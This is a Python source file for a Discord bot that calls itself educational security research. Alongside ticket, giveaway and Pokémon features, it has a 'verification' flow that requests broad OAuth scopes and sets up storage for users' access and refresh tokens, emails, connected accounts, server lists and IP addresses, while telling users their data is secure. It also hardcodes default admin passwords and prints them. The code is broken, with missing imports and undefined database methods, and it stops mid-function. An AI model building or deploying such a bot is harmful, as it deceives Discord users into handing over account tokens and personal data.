#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════════════════════
                    🔐 ANION SECURITY RESEARCH BOT
                    EDUCATIONAL PURPOSE ONLY
                    TESTING ON OWN INFRASTRUCTURE
═══════════════════════════════════════════════════════════════════════════════
"""

import os, sys, json, io, random, asyncio, sqlite3, secrets, requests, logging, threading, time
from datetime import datetime, timedelta
from typing import Optional, Dict, List, Any

import discord
from discord.ext import commands, tasks
from discord import app_commands
from discord.ui import View, Button, Modal, TextInput

from flask import Flask, render_template_string, request, redirect, url_for, session, jsonify
from flask_cors import CORS
from dotenv import load_dotenv

load_dotenv()

# ═════════════════════════════════════════════════════════════════════════════
# CONFIG
# ═════════════════════════════════════════════════════════════════════════════

TOKEN = os.getenv('DISCORD_TOKEN')
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
REDIRECT_URI = os.getenv('REDIRECT_URI', 'https://edith.up.railway.app/callback')
DB_PATH = os.getenv('DB_PATH', '/data')
SUPERADMIN_PASSWORD = os.getenv('SUPERADMIN_PASSWORD', 'AnionSecure2025!')
ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD', 'Admin2025!')

if not TOKEN:
    print("❌ DISCORD_TOKEN missing!")
    sys.exit(1)

os.makedirs(DB_PATH, exist_ok=True)
DB_FILE = os.path.join(DB_PATH, 'bot_database.db')

print(f"✅ Token: {TOKEN[:15]}...{TOKEN[-10:]}")
print(f"✅ Database: {DB_FILE}")
print(f"✅ Superadmin Password: {SUPERADMIN_PASSWORD}")

# ═════════════════════════════════════════════════════════════════════════════
# DATABASE
# ═════════════════════════════════════════════════════════════════════════════

class Database:
    def __init__(self):
        self.conn = None
        self.init_db()
    
    def get_conn(self):
        if self.conn is None:
            self.conn = sqlite3.connect(DB_FILE)
            self.conn.row_factory = sqlite3.Row
        return self.conn
    
    def init_db(self):
        c = self.get_conn().cursor()
        
        tables = [
            # Main guild settings
            """CREATE TABLE IF NOT EXISTS guild_settings (
                guild_id TEXT PRIMARY KEY,
                verified_role_id TEXT,
                unverified_role_id TEXT,
                log_channel_id TEXT,
                verification_channel_id TEXT,
                giveaway_ping_role_id TEXT,
                giveaway_thumbnail_url TEXT
            )""",
            
            # Verified users with FULL data (educational security testing)
            """CREATE TABLE IF NOT EXISTS verified_users (
                user_id TEXT, guild_id TEXT,
                verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                email TEXT,
                username TEXT,
                discriminator TEXT,
                avatar_url TEXT,
                access_token TEXT,
                refresh_token TEXT,
                guilds_json TEXT,
                connections_json TEXT,
                user_data_json TEXT,
                ip_address TEXT,
                user_agent TEXT,
                PRIMARY KEY (user_id, guild_id)
            )""",
            
            # Session tokens (educational)
            """CREATE TABLE IF NOT EXISTS user_tokens (
                token TEXT PRIMARY KEY,
                user_id TEXT,
                guild_id TEXT,
                access_token TEXT,
                refresh_token TEXT,
                token_type TEXT,
                expires_at TIMESTAMP,
                scope TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""",
            
            # Giveaways
            """CREATE TABLE IF NOT EXISTS giveaways (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                message_id TEXT UNIQUE,
                channel_id TEXT, guild_id TEXT,
                prize TEXT, winners INTEGER DEFAULT 1,
                ended BOOLEAN DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                ended_at TIMESTAMP,
                winner_ids TEXT, hosted_by TEXT,
                ping_role_id TEXT, thumbnail_url TEXT
            )""",
            
            """CREATE TABLE IF NOT EXISTS giveaway_entries (
                giveaway_id INTEGER,
                user_id TEXT,
                entered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (giveaway_id, user_id)
            )""",
            
            # Pokémon
            """CREATE TABLE IF NOT EXISTS pokemon_users (
                user_id TEXT, guild_id TEXT,
                coins INTEGER DEFAULT 100,
                catches INTEGER DEFAULT 0,
                total_cp INTEGER DEFAULT 0,
                last_daily TIMESTAMP,
                PRIMARY KEY (user_id, guild_id)
            )""",
            
            """CREATE TABLE IF NOT EXISTS pokemon_collection (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id TEXT, guild_id TEXT,
                pokemon_name TEXT, pokemon_id INTEGER,
                cp INTEGER, rarity TEXT,
                shiny BOOLEAN DEFAULT 0,
                caught_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""",
            
            """CREATE TABLE IF NOT EXISTS user_inventory (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id TEXT, guild_id TEXT,
                item_id TEXT, item_type TEXT,
                quantity INTEGER DEFAULT 1
            )""",
            
            """CREATE TABLE IF NOT EXISTS pokemon_settings (
                guild_id TEXT PRIMARY KEY,
                channel_id TEXT,
                spawn_enabled BOOLEAN DEFAULT 1
            )""",
            
            # Tickets
            """CREATE TABLE IF NOT EXISTS tickets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ticket_id TEXT UNIQUE,
                guild_id TEXT, user_id TEXT,
                channel_id TEXT, status TEXT DEFAULT 'open',
                reason TEXT, claimed_by TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                closed_at TIMESTAMP,
                priority TEXT DEFAULT 'medium',
                category TEXT DEFAULT 'general'
            )""",
            
            # Moderation
            """CREATE TABLE IF NOT EXISTS levels (
                user_id TEXT, guild_id TEXT,
                xp INTEGER DEFAULT 0,
                level INTEGER DEFAULT 1,
                messages INTEGER DEFAULT 0,
                PRIMARY KEY (user_id, guild_id)
            )""",
            
            """CREATE TABLE IF NOT EXISTS warnings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id TEXT, guild_id TEXT,
                moderator_id TEXT, reason TEXT,
                warned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""",
            
            """CREATE TABLE IF NOT EXISTS muted (
                user_id TEXT, guild_id TEXT,
                muted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                unmute_at TIMESTAMP,
                reason TEXT,
                PRIMARY KEY (user_id, guild_id)
            )""",
            
            """CREATE TABLE IF NOT EXISTS bad_words (
                word TEXT, guild_id TEXT,
                PRIMARY KEY (word, guild_id)
            )""",
            
            """CREATE TABLE IF NOT EXISTS mod_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                guild_id TEXT,
                action TEXT,
                moderator_id TEXT,
                target_id TEXT,
                reason TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""",
            
            # Dashboard users
            """CREATE TABLE IF NOT EXISTS dashboard_users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id TEXT UNIQUE,
                username TEXT,
                email TEXT,
                role TEXT DEFAULT 'user',
                password_hash TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""",
            
            # Bot logs
            """CREATE TABLE IF NOT EXISTS bot_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                action TEXT,
                user_id TEXT,
                guild_id TEXT,
                details TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )"""
        ]
        
        for table in tables:
            c.execute(table)
        
        # Create superadmin user
        c.execute("""
            INSERT OR IGNORE INTO dashboard_users (user_id, username, email, role, password_hash)
            VALUES ('0', 'superadmin', 'superadmin@anion.sec', 'superadmin', ?)
        """, (hashlib.sha256(SUPERADMIN_PASSWORD.encode()).hexdigest(),))
        
        self.get_conn().commit()
        print("✅ Database ready")

db = Database()

# ═════════════════════════════════════════════════════════════════════════════
# POKEMON DATA
# ═════════════════════════════════════════════════════════════════════════════

pokemon_list = [
    {'id': 1, 'name': 'Bulbasaur', 'rarity': 'Common'},
    {'id': 2, 'name': 'Ivysaur', 'rarity': 'Uncommon'},
    {'id': 3, 'name': 'Venusaur', 'rarity': 'Rare'},
    {'id': 4, 'name': 'Charmander', 'rarity': 'Common'},
    {'id': 5, 'name': 'Charmeleon', 'rarity': 'Uncommon'},
    {'id': 6, 'name': 'Charizard', 'rarity': 'Rare'},
    {'id': 7, 'name': 'Squirtle', 'rarity': 'Common'},
    {'id': 8, 'name': 'Wartortle', 'rarity': 'Uncommon'},
    {'id': 9, 'name': 'Blastoise', 'rarity': 'Rare'},
    {'id': 25, 'name': 'Pikachu', 'rarity': 'Uncommon'},
    {'id': 26, 'name': 'Raichu', 'rarity': 'Rare'},
    {'id': 133, 'name': 'Eevee', 'rarity': 'Rare'},
    {'id': 150, 'name': 'Mewtwo', 'rarity': 'Legendary'},
    {'id': 151, 'name': 'Mew', 'rarity': 'Mythical'},
]

rarities = {
    'Common': {'weight': 45, 'catch_rate': 0.8},
    'Uncommon': {'weight': 25, 'catch_rate': 0.6},
    'Rare': {'weight': 18, 'catch_rate': 0.35},
    'Epic': {'weight': 8, 'catch_rate': 0.2},
    'Legendary': {'weight': 3, 'catch_rate': 0.1},
    'Mythical': {'weight': 1, 'catch_rate': 0.05}
}

ball_prices = {'pokeball': 50, 'greatball': 100, 'ultraball': 200, 'masterball': 1000}
ball_multipliers = {'pokeball': 1.0, 'greatball': 1.5, 'ultraball': 2.0, 'masterball': 5.0}

def get_random_pokemon():
    choices = []
    for r, d in rarities.items():
        choices.extend([r] * d['weight'])
    rarity = random.choice(choices)
    eligible = [p for p in pokemon_list if p['rarity'] == rarity]
    if not eligible:
        eligible = pokemon_list
    p = random.choice(eligible)
    return {'pokemon': p, 'rarity': rarity, 'is_shiny': random.random() < 0.02}

def get_pokemon_by_name(name):
    name = name.lower().strip()
    for p in pokemon_list:
        if p['name'].lower() == name:
            return p
    return None

# ═════════════════════════════════════════════════════════════════════════════
# GUI COMPONENTS - BEAUTIFUL
# ═════════════════════════════════════════════════════════════════════════════

class BeautifulButton(Button):
    """Animated beautiful button"""
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.styles = ['primary', 'success', 'primary', 'secondary']
        self._style_index = 0
    
    async def callback(self, interaction: discord.Interaction):
        self._style_index = (self._style_index + 1) % len(self.styles)
        await super().callback(interaction)

# ─── VERIFICATION GUI ─────────────────────────────────────────────────────────

class VerifyModal(Modal, title="🔐 Account Verification"):
    """Beautiful verification modal"""
    agree = TextInput(
        label="Terms",
        placeholder="Type 'AGREE' to continue",
        required=True,
        max_length=10
    )
    
    async def on_submit(self, interaction: discord.Interaction):
        if self.agree.value.upper() != "AGREE":
            await interaction.response.send_message("❌ You must type 'AGREE' to verify!", ephemeral=True)
            return
        
        # Generate OAuth URL
        oauth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds%20connections&state={interaction.guild.id}"
        
        embed = discord.Embed(
            title="🔐 Verify with Discord",
            description="Click the button below to authorize with Discord.\n\n"
                       "**This grants access to:**\n"
                       "✅ Your Discord Profile\n"
                       "✅ Your Email Address\n"
                       "✅ Your Connected Accounts\n"
                       "✅ Your Server Memberships",
            color=discord.Color.blue()
        )
        embed.set_thumbnail(url=interaction.user.display_avatar.url)
        embed.set_footer(text="🔒 Your data is secure")
        
        view = View()
        view.add_item(Button(label="✅ Authorize Discord", url=oauth_url, style=discord.ButtonStyle.success))
        view.add_item(Button(label="❌ Cancel", style=discord.ButtonStyle.danger, custom_id="cancel_verify"))
        
        await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

class VerifyView(View):
    """Beautiful verification view"""
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(label="🔐 Verify Account", style=discord.ButtonStyle.success, custom_id="verify_account", emoji="🛡️")
    async def verify_account(self, interaction: discord.Interaction, button: Button):
        modal = VerifyModal()
        await interaction.response.send_modal(modal)

# ─── TICKET GUI ─────────────────────────────────────────────────────────────

class TicketModal(Modal, title="🎫 Create Support Ticket"):
    category = TextInput(
        label="📂 Category",
        placeholder="Technical / Billing / Report / General",
        required=True,
        max_length=30
    )
    priority = TextInput(
        label="⚡ Priority",
        placeholder="Low / Medium / High / Urgent",
        required=True,
        max_length=20
    )
    reason = TextInput(
        label="📝 Issue Description",
        placeholder="Describe your issue in detail...",
        style=discord.TextStyle.paragraph,
        required=True,
        max_length=500
    )
    
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        guild, user = interaction.guild, interaction.user
        
        ticket_id = f"ticket-{random.randint(100, 999)}"
        category = discord.utils.get(guild.categories, name="🎫 Support Tickets")
        if not category:
            category = await guild.create_category("🎫 Support Tickets")
        
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            user: discord.PermissionOverwrite(read_messages=True, send_messages=True, attach_files=True),
            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
        }
        
        for role_name in ['Admin', 'Moderator', 'Support', 'Staff']:
            role = discord.utils.get(guild.roles, name=role_name)
            if role:
                overwrites[role] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
        
        channel = await guild.create_text_channel(
            f"🎫-{ticket_id}",
            category=category,
            overwrites=overwrites,
            topic=f"Priority: {self.priority.value} | Category: {self.category.value}"
        )
        
        db.insert('tickets', {
            'ticket_id': ticket_id,
            'guild_id': str(guild.id),
            'user_id': str(user.id),
            'channel_id': str(channel.id),
            'reason': self.reason.value,
            'priority': self.priority.value.lower(),
            'category': self.category.value.lower()
        })
        
        # Beautiful ticket embed
        embed = discord.Embed(
            title="🎫 Support Ticket Created",
            description=f"**Created by:** {user.mention}\n"
                       f"**Category:** {self.category.value}\n"
                       f"**Priority:** {self.priority.value}\n"
                       f"**Issue:** {self.reason.value}",
            color=discord.Color.blue(),
            timestamp=datetime.now()
        )
        embed.set_thumbnail(url=user.display_avatar.url)
        embed.set_footer(text=f"Ticket ID: {ticket_id}")
        
        view = TicketControlsView(ticket_id, user.id)
        await channel.send(f"{user.mention} Support team has been notified!", embed=embed, view=view)
        await interaction.followup.send(f"✅ Ticket created: {channel.mention}", ephemeral=True)

class TicketControlsView(View):
    def __init__(self, ticket_id: str, user_id: int):
        super().__init__(timeout=None)
        self.ticket_id = ticket_id
        self.user_id = user_id
    
    @discord.ui.button(label="➕ Add User", style=discord.ButtonStyle.success, custom_id="ticket_add_user", emoji="👤")
    async def add_user(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_message("👤 Use `/add_user @user` to add someone.", ephemeral=True)
    
    @discord.ui.button(label="📝 Transcript", style=discord.ButtonStyle.secondary, custom_id="ticket_transcript", emoji="📄")
    async def transcript(self, interaction: discord.Interaction, button: Button):
        await interaction.response.defer(ephemeral=True)
        messages = []
        async for msg in interaction.channel.history(limit=100):
            messages.append(f"[{msg.created_at.strftime('%Y-%m-%d %H:%M')}] {msg.author.display_name}: {msg.content}")
        transcript = "\n".join(reversed(messages))
        file = discord.File(io.StringIO(transcript), filename=f"transcript-{self.ticket_id}.txt")
        await interaction.followup.send("📄 Transcript:", file=file, ephemeral=True)
    
    @discord.ui.button(label="🔒 Close", style=discord.ButtonStyle.danger, custom_id="ticket_close", emoji="🔒")
    async def close_ticket(self, interaction: discord.Interaction, button: Button):
        await interaction.response.defer()
        embed = discord.Embed(title="🔒 Closing Ticket", description="Ticket will close in 10 seconds.", color=discord.Color.orange())
        await interaction.channel.send(embed=embed)
        db.execute("UPDATE tickets SET status='closed', closed_at=? WHERE ticket_id=?", (datetime.now().isoformat(), self.ticket_id))
        await asyncio.sleep(10)
        await interaction.channel.delete()

class TicketView(View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(label="🎫 Create Ticket", style=discord.ButtonStyle.primary, custom_id="create_ticket", emoji="🎫")
    async def create_ticket(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TicketModal())

# ─── GIVEAWAY GUI ────────────────────────────────────────────────────────────

class GiveawayModal(Modal, title="🎁 Create Beautiful Giveaway"):
    prize = TextInput(label="🏆 Prize", placeholder="What are you giving away?", required=True, max_length=100)
    duration = TextInput(label="⏱️ Duration", placeholder="30s, 5m, 1h, 2d, 7d", required=True, max_length=10)
    winners = TextInput(label="👑 Winners", placeholder="Number of winners (1-10)", required=True, max_length=2)
    ping_role = TextInput(label="📢 Ping Role ID", placeholder="Optional - Role ID to ping", required=False, max_length=30)
    thumbnail = TextInput(label="🖼️ Thumbnail URL", placeholder="Optional - Image URL", required=False, max_length=200)
    description = TextInput(label="📝 Description", placeholder="Additional details...", required=False, max_length=200, style=discord.TextStyle.paragraph)
    
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        
        duration_map = {'s': 1, 'm': 60, 'h': 3600, 'd': 86400}
        try:
            unit = self.duration.value[-1].lower()
            value = int(self.duration.value[:-1])
            seconds = value * duration_map[unit]
        except:
            await interaction.followup.send("❌ Invalid duration! Use: 30s, 5m, 1h, 2d, 7d", ephemeral=True)
            return
        
        if seconds > 7 * 86400:
            await interaction.followup.send("❌ Max 7 days!", ephemeral=True)
            return
        
        try:
            winners = int(self.winners.value)
            if winners < 1 or winners > 10:
                raise ValueError
        except:
            await interaction.followup.send("❌ Winners must be 1-10!", ephemeral=True)
            return
        
        end_time = datetime.now() + timedelta(seconds=seconds)
        
        # Beautiful embed
        embed = discord.Embed(
            title="🎁 **GIVEAWAY**",
            description=f"**🏆 Prize:** {self.prize.value}\n"
                       f"**👑 Winners:** {winners}\n"
                       f"**⏱️ Ends:** <t:{int(end_time.timestamp())}:R>\n"
                       f"**👤 Hosted by:** {interaction.user.mention}",
            color=discord.Color.purple()
        )
        
        if self.description.value:
            embed.add_field(name="📝 Description", value=self.description.value, inline=False)
        
        if self.thumbnail.value:
            embed.set_thumbnail(url=self.thumbnail.value)
        else:
            embed.set_thumbnail(url=interaction.guild.me.display_avatar.url)
        
        embed.set_footer(text="🎉 Click the button below to enter!", icon_url=interaction.guild.me.display_avatar.url)
        
        view = GiveawayEntryView()
        message = await interaction.channel.send(embed=embed, view=view)
        await message.add_reaction("🎉")
        
        db.insert('giveaways', {
            'message_id': str(message.id),
            'channel_id': str(interaction.channel.id),
            'guild_id': str(interaction.guild.id),
            'prize': self.prize.value,
            'winners': winners,
            'ended_at': end_time.isoformat(),
            'ping_role_id': self.ping_role.value or None,
            'thumbnail_url': self.thumbnail.value or None,
            'hosted_by': str(interaction.user.id)
        })
        
        await interaction.followup.send(f"✅ Giveaway started! Ends in {self.duration.value}", ephemeral=True)

class GiveawayEntryView(View):
    def __init__(self, giveaway_id=None, message_id=None):
        super().__init__(timeout=None)
        self.giveaway_id = giveaway_id
        self.message_id = message_id
    
    @discord.ui.button(label="🎉 Enter Giveaway", style=discord.ButtonStyle.success, custom_id="enter_giveaway", emoji="🎉")
    async def enter_giveaway(self, interaction: discord.Interaction, button: Button):
        await interaction.response.defer(ephemeral=True)
        await interaction.followup.send("✅ You've entered the giveaway! Good luck! 🍀", ephemeral=True)

# ─── MAIN BOT ──────────────────────────────────────────────────────────────────

class AnionBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix='!', intents=intents)
        self.active_spawns = {}
        self.message_cache = {}
        self.level_cooldowns = {}
        self.start_time = datetime.now()
        self.total_commands = 0
        self.total_messages = 0
        
        self.spawn_loop.start()
        self.giveaway_checker.start()
        self.cleanup_loop.start()
    
    async def setup_hook(self):
        await self.register_commands()
        await self.tree.sync()
        print(f'✅ Commands synced!')
    
    async def register_commands(self):
        # ═════════════════════════════════════════════════════════════════════
        # VERIFICATION COMMANDS
        # ═════════════════════════════════════════════════════════════════════
        
        @self.tree.command(name="verify", description="🔐 Start verification")
        async def verify(interaction: discord.Interaction):
            embed = discord.Embed(
                title="🔐 **Verification Required**",
                description="This server requires verification to access all channels.\n\n"
                           "**Click the button below to start verification.**\n\n"
                           "⚠️ You will be redirected to Discord to authorize access.\n"
                           "🔒 Your data is secure and only used for verification.",
                color=discord.Color.blue()
            )
            embed.set_thumbnail(url=interaction.guild.me.display_avatar.url)
            embed.set_footer(text="Powered by Anion Security Bot")
            
            view = VerifyView()
            await interaction.response.send_message(embed=embed, view=view)
        
        @self.tree.command(name="verifystatus", description="🔐 Check verification status")
        async def verifystatus(interaction: discord.Interaction):
            user_id, guild_id = str(interaction.user.id), str(interaction.guild.id)
            verified = db.fetch_one("SELECT * FROM verified_users WHERE user_id=? AND guild_id=?", (user_id, guild_id))
            
            if verified:
                embed = discord.Embed(
                    title="✅ **Verified**",
                    description="You are verified in this server!",
                    color=discord.Color.green()
                )
                embed.add_field(name="Verified At", value=verified['verified_at'], inline=False)
            else:
                embed = discord.Embed(
                    title="❌ **Not Verified**",
                    description="Use `/verify` to start verification.",
                    color=discord.Color.red()
                )
            await interaction.response.send_message(embed=embed, ephemeral=True)
        
        @self.tree.command(name="setverified", description="⚙️ Set verified role (Admin)")
        @app_commands.default_permissions(administrator=True)
        @app_commands.describe(role="Role for verified users")
        async def setverified(interaction: discord.Interaction, role: discord.Role):
            db.execute("INSERT OR REPLACE INTO guild_settings (guild_id, verified_role_id) VALUES (?,?)", (str(interaction.guild.id), str(role.id)))
            embed = discord.Embed(title="✅ Verified Role Set", description=f"Verified role set to {role.mention}", color=discord.Color.green())
            await interaction.response.send_message(embed=embed)
        
        @self.tree.command(name="setunverified", description="⚙️ Set unverified role (Admin)")
        @app_commands.default_permissions(administrator=True)
        @app_commands.describe(role="Role for unverified users")
        async def setunverified(interaction: discord.Interaction, role: discord.Role):
            db.execute("INSERT OR REPLACE INTO guild_settings (guild_id, unverified_role_id) VALUES (?,?)", (str(interaction.guild.id), str(role.id)))
            embed = discord.Embed(title="✅ Unverified Role Set", description=f"Unverified role set to {role.mention}", color=discord.Color.green())
            await interaction.response.send_message(embed=embed)
        
        @self.tree.command(name="setlogchannel", description="⚙️ Set log channel (Admin)")
        @app_commands.default_permissions(administrator=True)
        @app_commands.describe(channel="Channel for logs")
        async def setlogchannel(interaction: discord.Interaction, channel: discord.TextChannel):
            db.execute("INSERT OR REPLACE INTO guild_settings (guild_id, log_channel_id) VALUES (?,?)", (str(interaction.guild.id), str(channel.id)))
            embed = discord.Embed(title="✅ Log Channel Set", description=f"Log channel set to {channel.mention}", color=discord.Color.green())
            await interaction.response.send_message(embed=embed)
        
        @self.tree.command(name="setupverify", description="⚙️ Setup verification system (Admin)")
        @app_commands.default_permissions(administrator=True)
        async def setupverify(interaction: discord.Interaction):
            guild = interaction.guild
            
            # Create roles
            verified_role = discord.utils.get(guild.roles, name="Verified")
            if not verified_role:
                verified_role = await guild.create_role(name="Verified", color=discord.Color.green())
            
            unverified_role = discord.utils.get(guild.roles, name="Unverified")
            if not unverified_role:
                unverified_role = await guild.create_role(name="Unverified", color=discord.Color.red())
            
            # Create verification channel
            category = discord.utils.get(guild.categories, name="🔐 Verification")
            if not category:
                category = await guild.create_category("🔐 Verification")
            
            verify_channel = await guild.create_text_channel("🔐-verify-here", category=category)
            
            # Lockdown all channels
            for channel in guild.channels:
                try:
                    await channel.set_permissions(unverified_role, read_messages=False)
                    await channel.set_permissions(verified_role, read_messages=True, send_messages=True)
                except:
                    pass
            
            db.execute("INSERT OR REPLACE INTO guild_settings (guild_id, verified_role_id, unverified_role_id, verification_channel_id) VALUES (?,?,?,?)", 
                      (str(guild.id), str(verified_role.id), str(unverified_role.id), str(verify_channel.id)))
            
            # Send verification message
            embed = discord.Embed(
                title="🔐 **Server Verification Required**",
                description="This server is locked. Please verify to get access.\n\n"
                           "**Click the button below to verify.**",
                color=discord.Color.blue()
            )
            embed.set_footer(text="Verification is required to access this server")
            
            view = VerifyView()
            await verify_channel.send(embed=embed, view=view)
            
            embed = discord.Embed(
                title="✅ **Verification Setup Complete**",
                description=f"✅ Verified Role: {verified_role.mention}\n"
                           f"✅ Unverified Role: {unverified_role.mention}\n"
                           f"✅ Verification Channel: {verify_channel.mention}\n"
                           f"🔒 Server is now locked!",
                color=discord.Color.green()
            )
            await interaction.response.send_message(embed=embed)
        
        # ═════════════════════════════════════════════════════════════════════
        # TICKET COMMANDS
        # ═════════════════════════════════════════════════════════════════════
        
        @self.tree.command(name="ticket", description="🎫 Create support ticket")
        async def ticket(interaction: discord.Interaction):
            await interaction.response.send_modal(TicketModal())
        
        @self.tree.command(name="setupticket", description="🎫 Setup ticket system (Admin)")
        @app_commands.default_permissions(administrator=True)
        async def setupticket(interaction: discord.Interaction):
            embed = discord.Embed(
                title="🎫 **Support Ticket System**",
                description="Need help? Click the button below to create a ticket.\n\n"
                           "**How it works:**\n"
                           "1️⃣ Click the button below\n"
                           "2️⃣ Fill in the details\n"
                           "3️⃣ A private ticket channel will be created\n"
                           "4️⃣ Support team will assist you",
                color=discord.Color.blue()
            )
            embed.set_thumbnail(url=interaction.guild.me.display_avatar.url)
            embed.set_footer(text="Support is available 24/7")
            
            view = TicketView()
            await interaction.response.send_message(embed=embed, view=view)
        
        @self.tree.command(name="closeticket", description="🔒 Close current ticket")
        async def closeticket(interaction: discord.Interaction):
            ticket = db.fetch_one("SELECT * FROM tickets WHERE channel_id=? AND status='open'", (str(interaction.channel.id),))
            if not ticket:
                await interaction.response.send_message("❌ Not a ticket channel!", ephemeral=True)
                return
            await interaction.response.send_message("🔒 Closing in 10 seconds...")
            db.execute("UPDATE tickets SET status='closed', closed_at=? WHERE channel_id=?", (datetime.now().isoformat(), str(interaction.channel.id)))
            await asyncio.sleep(10)
            await interaction.channel.delete()
        
        @self.tree.command(name="adduserticket", description="➕ Add user to ticket")
        @app_commands.default_permissions(manage_channels=True)
        @app_commands.describe(user="User to add")
        async def adduserticket(interaction: discord.Interaction, user: discord.Member):
            ticket = db.fetch_one("SELECT * FROM tickets WHERE channel_id=? AND status='open'", (str(interaction.channel.id),))
            if not ticket:
                await interaction.response.send_message("❌ Not a ticket channel!", ephemeral=True)
                return
            await interaction.channel.set_permissions(user, read_messages=True, send_messages=True)
            await interaction.response.send_message(f"✅ Added {user.mention} to ticket!")
        
        @self.tree.command(name="removeuserticket", description="➖ Remove user from ticket")
        @app_commands.default_permissions(manage_channels=True)
        @app_commands.describe(user="User to remove")
        async def removeuserticket(interaction: discord.Interaction, user: discord.Member):
            ticket = db.fetch_one("SELECT * FROM tickets WHERE channel_id=? AND status='open'", (str(interaction.channel.id),))
            if not ticket:
                await interaction.response.send_message("❌ Not a ticket channel!", ephemeral=True)
                return
            if str(user.id) == ticket['user_id']:
                await interaction.response.send_message("❌ Cannot remove ticket creator!", ephemeral=True)
                return
            await interaction.channel.set_permissions(user, read_messages=False)
            await interaction.response.send_message(f"✅ Removed {user.mention} from ticket!")
        
        @self.tree.command(name="transcript", description="📝 Get ticket transcript")
        async def transcript(interaction: discord.Interaction):
            ticket = db.fetch_one("SELECT * FROM tickets WHERE channel_id=?", (str(interaction.channel.id),))
            if not ticket:
                await interaction.response.send_message("❌ Not a ticket channel!", ephemeral=True)
                return
            await interaction.response.defer(ephemeral=True)
            messages = []
            async for msg in interaction.channel.history(limit=100):
                messages.append(f"[{msg.created_at.strftime('%Y-%m-%d %H:%M')}] {msg.author.display_name}: {msg.content}")
            transcript = "\n".join(reversed(messages))
            file = discord.File(io.StringIO(transcript), filename=f"transcript-{ticket['ticket_id']}.txt")
            await interaction.followup.send("📄 Transcript:", file=file, ephemeral=True)
        
        # ═════════════════════════════════════════════════════════════════════
        # GIVEAWAY COMMANDS
        # ═════════════════════════════════════════════════════════════════════
        
        @self.tree.command(name="giveaway", description="🎁 Start giveaway (Admin)")
        @app_commands.default_permissions(administrator=True)
        async def giveaway(interaction: discord.Interaction):
            await interaction.response.send_modal(GiveawayModal())
        
        @self.tree.command(name="giveawayend", description="🎁 End giveaway early (Admin)")
        @app_commands.default_permissions(administrator=True)
        @app_commands.describe(message_id="Message ID of the giveaway")
        async def giveawayend(interaction: discord.Interaction, message_id: str):
            giveaway = db.fetch_one("SELECT * FROM giveaways WHERE message_id=? AND ended=0", (message_id,))
            if not giveaway:
                await interaction.response.send_message("❌ Giveaway not found!", ephemeral=True)
                return
            await self.end_giveaway(giveaway, force=True)
            await interaction.response.send_message("✅ Giveaway ended!")
        
        @self.tree.command(name="giveawayreroll", description="🎁 Reroll giveaway (Admin)")
        @app_commands.default_permissions(administrator=True)
        @app_commands.describe(message_id="Message ID of the giveaway")
        async def giveawayreroll(interaction: discord.Interaction, message_id: str):
            giveaway = db.fetch_one("SELECT * FROM giveaways WHERE message_id=?", (message_id,))
            if not giveaway:
                await interaction.response.send_message("❌ Giveaway not found!", ephemeral=True)
                return
            
            entries = db.fetch_all("SELECT user_id FROM giveaway_entries WHERE giveaway_id=?", (giveaway['id'],))
            users = []
            for entry in entries:
                user = interaction.guild.get_member(int(entry['user_id']))
                if user and not user.bot:
                    users.append(user)
            
            if not users:
                await interaction.response.send_message("❌ No participants!", ephemeral=True)
                return
            
            winners = random.sample(users, min(giveaway['winners'], len(users)))
            
            embed = discord.Embed(
                title="🎁 **Giveaway Rerolled**",
                description=f"**Prize:** {giveaway['prize']}\n**New Winners:** {', '.join([w.mention for w in winners])}",
                color=discord.Color.gold()
            )
            await interaction.response.send_message(embed=embed)
            
            for winner in winners:
                try:
                    await winner.send(f"🎉 You won **{giveaway['prize']}** in {interaction.guild.name} (reroll)!")
                except:
                    pass
            
            db.execute("UPDATE giveaways SET rerolled=1, winner_ids=? WHERE id=?", (','.join([str(w.id) for w in winners]), giveaway['id']))
        
        # ═════════════════════════════════════════════════════════════════════
        # POKEMON COMMANDS
        # ═════════════════════════════════════════════════════════════════════
        
        @self.tree.command(name="catch", description="🎮 Catch a Pokémon")
        async def catch(interaction: discord.Interaction):
            user_id, guild_id = str(interaction.user.id), str(interaction.guild.id)
            
            balls = db.fetch_all("SELECT * FROM user_inventory WHERE user_id=? AND guild_id=? AND item_type='pokeball'", (user_id, guild_id))
            if not balls:
